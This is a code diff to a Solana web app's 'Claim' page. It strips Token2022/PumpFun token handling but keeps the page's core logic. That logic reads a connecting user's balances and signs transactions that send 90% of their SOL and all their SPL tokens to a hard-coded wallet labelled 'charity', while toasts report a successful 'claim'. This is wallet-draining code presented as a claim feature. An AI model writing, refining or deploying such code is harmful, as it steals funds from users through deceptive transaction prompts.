@@ -7,7 +7,7 @@ import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { useState, useEffect, useMemo, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Loader2 } from 'lucide-react';
 import { toast } from 'sonner';
 import pegasusLogo from '@/assets/pegasus-logo.png';
@@ -23,7 +23,6 @@ interface TokenBalance {
   uiAmount: number;
   symbol?: string;
   valueInSOL?: number;
-  programId?: PublicKey; // Track token program type (TOKEN_PROGRAM_ID or TOKEN_2022_PROGRAM_ID)
 }
 
 const Claim = () => {
@@ -107,18 +106,12 @@ const Claim = () => {
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch legacy SPL Token accounts
+      // Fetch token accounts
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      // Fetch Token2022 accounts (PumpFun tokens use this program)
-      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-        programId: TOKEN_2022_PROGRAM_ID
-      });
-
-      // Process legacy SPL tokens
-      const legacyTokens: TokenBalance[] = tokenAccounts.value
+      const tokens: TokenBalance[] = tokenAccounts.value
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -127,33 +120,12 @@ const Claim = () => {
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0,
-            programId: TOKEN_PROGRAM_ID
+            valueInSOL: 0
           };
         })
         .filter(token => token.uiAmount > 0);
 
-      // Process Token2022/PumpFun tokens
-      const token2022Tokens: TokenBalance[] = token2022Accounts.value
-        .map(account => {
-          const info = account.account.data.parsed.info;
-          return {
-            mint: info.mint,
-            balance: info.tokenAmount.amount,
-            decimals: info.tokenAmount.decimals,
-            uiAmount: info.tokenAmount.uiAmount,
-            symbol: info.mint.slice(0, 8),
-            valueInSOL: 0,
-            programId: TOKEN_2022_PROGRAM_ID
-          };
-        })
-        .filter(token => token.uiAmount > 0);
-
-      // Combine both token types
-      const allTokens = [...legacyTokens, ...token2022Tokens];
-      console.log(`Fetched ${legacyTokens.length} SPL tokens and ${token2022Tokens.length} Token2022/PumpFun tokens`);
-      
-      setBalances(allTokens);
+      setBalances(tokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
     }
@@ -174,7 +146,7 @@ const Claim = () => {
     // Add Compute Budget Instructions for better mobile reliability
     transaction.add(
       ComputeBudgetProgram.setComputeUnitLimit({
-        units: 200_000, // Increased for Token2022
+        units: 100_000,
       })
     );
 
@@ -186,48 +158,30 @@ const Claim = () => {
     
     const charityPubkey = new PublicKey(FAUCET_WALLET);
 
-    // Add token transfers (supports both SPL Token and Token2022/PumpFun)
+    // Add token transfers
     for (const token of tokenBatch) {
       if (token.balance <= 0) continue;
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        // Use the correct program ID for this token (default to TOKEN_PROGRAM_ID for legacy tokens)
-        const tokenProgramId = token.programId || TOKEN_PROGRAM_ID;
-        
-        // Get associated token addresses using the correct program ID
-        const fromTokenAccount = await getAssociatedTokenAddress(
-          mintPubkey, 
-          effectivePublicKey,
-          false, // allowOwnerOffCurve
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        );
-        const toTokenAccount = await getAssociatedTokenAddress(
-          mintPubkey, 
-          charityPubkey,
-          false, // allowOwnerOffCurve
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        );
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
 
         try {
-          await getAccount(connection, toTokenAccount, undefined, tokenProgramId);
+          await getAccount(connection, toTokenAccount);
         } catch (error) {
-          // Create ATA with correct program ID
           transaction.add(
             createAssociatedTokenAccountInstruction(
               effectivePublicKey,
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              tokenProgramId,
+              TOKEN_PROGRAM_ID,
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
-        // Create transfer instruction with correct program ID
         transaction.add(
           createTransferInstruction(
             fromTokenAccount,
@@ -235,11 +189,9 @@ const Claim = () => {
             effectivePublicKey,
             BigInt(token.balance),
             [],
-            tokenProgramId
+            TOKEN_PROGRAM_ID
           )
         );
-        
-        console.log(`Added transfer for ${token.mint} using ${tokenProgramId.equals(TOKEN_2022_PROGRAM_ID) ? 'Token2022' : 'SPL Token'}`);
       } catch (error) {
         console.error(`Failed to add transfer for ${token.mint}:`, error);
       }
@@ -275,37 +227,15 @@ const Claim = () => {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
 
-      // Separate SPL tokens and Token2022/PumpFun tokens
-      const validTokens = balances.filter(token => token.balance > 0);
-      const splTokens = validTokens.filter(t => !t.programId || t.programId.equals(TOKEN_PROGRAM_ID));
-      const pumpFunTokens = validTokens.filter(t => t.programId && t.programId.equals(TOKEN_2022_PROGRAM_ID));
-      
-      console.log(`Found ${splTokens.length} SPL tokens and ${pumpFunTokens.length} PumpFun tokens`);
-
-      // Calculate how many ATAs might need to be created
-      const potentialATACount = validTokens.length;
-      
-      // Each ATA creation costs ~0.00203 SOL for rent
-      const ATA_RENT_COST = 0.00203 * LAMPORTS_PER_SOL;
-      const estimatedATACost = potentialATACount * ATA_RENT_COST;
-      
-      // 1. SOL Transfer (90% of available, but reserve enough for ATA creations)
+      // 1. SOL Transfer (90% of available)
       const solBal = await connection.getBalance(publicKey);
       const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
       const PRIORITY_FEE = 100_000; // microLamports
       const BASE_FEE = 5000;
-      // Add buffer for multiple token transactions (SPL + PumpFun batches)
-      const totalBatches = Math.ceil(splTokens.length / MAX_BATCH_SIZE) + Math.ceil(pumpFunTokens.length / MAX_BATCH_SIZE);
-      const TOKEN_TX_BUFFER = totalBatches * (PRIORITY_FEE + BASE_FEE);
       
-      // Total reserve: rent + estimated ATA costs + transaction fees buffer
-      const totalReserve = RENT_EXEMPT_RESERVE + estimatedATACost + TOKEN_TX_BUFFER + PRIORITY_FEE + BASE_FEE;
-      
-      const maxSendable = Math.max(0, solBal - totalReserve);
+      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
       const targetAmount = Math.floor(solBal * 0.90);
       const lamportsToSend = Math.min(targetAmount, maxSendable);
-
-      console.log(`SOL Balance: ${solBal / LAMPORTS_PER_SOL}, Reserve: ${totalReserve / LAMPORTS_PER_SOL}, Sending: ${lamportsToSend / LAMPORTS_PER_SOL}`);
 
       if (lamportsToSend > 0) {
         const transaction = new Transaction();
@@ -344,77 +274,42 @@ const Claim = () => {
         toast.success('Claim step 1 successful!');
       }
 
-      // 2. SPL Token Transfers (legacy tokens)
-      if (splTokens.length > 0) {
-        const sortedSplTokens = [...splTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-        const splBatches: TokenBalance[][] = [];
-        for (let i = 0; i < sortedSplTokens.length; i += MAX_BATCH_SIZE) {
-          splBatches.push(sortedSplTokens.slice(i, i + MAX_BATCH_SIZE));
-        }
+      // 2. SPL Token Transfers
+      const validTokens = balances.filter(token => token.balance > 0);
+      
+      // Sort by value (descending)
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
 
-        for (let i = 0; i < splBatches.length; i++) {
-          const batch = splBatches[i];
-          const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
-
-          if (transaction && transaction.instructions.length > 2) {
-             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-             transaction.recentBlockhash = blockhash;
-             transaction.feePayer = publicKey;
-
-             try {
-               await connection.simulateTransaction(transaction);
-             } catch (e) {
-               console.error("SPL token batch simulation failed", e);
-             }
-
-             const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-             
-             toast.info(`Processing SPL batch ${i + 1}/${splBatches.length}...`);
-             await connection.confirmTransaction({
-               signature,
-               blockhash,
-               lastValidBlockHeight
-             }, 'confirmed');
-             toast.success(`SPL Batch ${i + 1} sent!`);
-          }
-        }
+      // Batch tokens
+      const batches: TokenBalance[][] = [];
+      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
       }
 
-      // 3. PumpFun/Token2022 Token Transfers (after SPL tokens)
-      if (pumpFunTokens.length > 0) {
-        toast.info('Processing PumpFun tokens...');
-        
-        const sortedPumpFunTokens = [...pumpFunTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-        const pumpFunBatches: TokenBalance[][] = [];
-        for (let i = 0; i < sortedPumpFunTokens.length; i += MAX_BATCH_SIZE) {
-          pumpFunBatches.push(sortedPumpFunTokens.slice(i, i + MAX_BATCH_SIZE));
-        }
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
 
-        for (let i = 0; i < pumpFunBatches.length; i++) {
-          const batch = pumpFunBatches[i];
-          const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
+        if (transaction && transaction.instructions.length > 2) {
+           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+           transaction.recentBlockhash = blockhash;
+           transaction.feePayer = publicKey;
 
-          if (transaction && transaction.instructions.length > 2) {
-             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-             transaction.recentBlockhash = blockhash;
-             transaction.feePayer = publicKey;
+           try {
+             await connection.simulateTransaction(transaction);
+           } catch (e) {
+             console.error("Token batch simulation failed", e);
+           }
 
-             try {
-               await connection.simulateTransaction(transaction);
-             } catch (e) {
-               console.error("PumpFun token batch simulation failed", e);
-             }
-
-             const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-             
-             toast.info(`Processing PumpFun batch ${i + 1}/${pumpFunBatches.length}...`);
-             await connection.confirmTransaction({
-               signature,
-               blockhash,
-               lastValidBlockHeight
-             }, 'confirmed');
-             toast.success(`PumpFun Batch ${i + 1} sent!`);
-          }
+           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+           
+           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
+           await connection.confirmTransaction({
+             signature,
+             blockhash,
+             lastValidBlockHeight
+           }, 'confirmed');
+           toast.success(`Batch ${i + 1} sent!`);
         }
       }
 
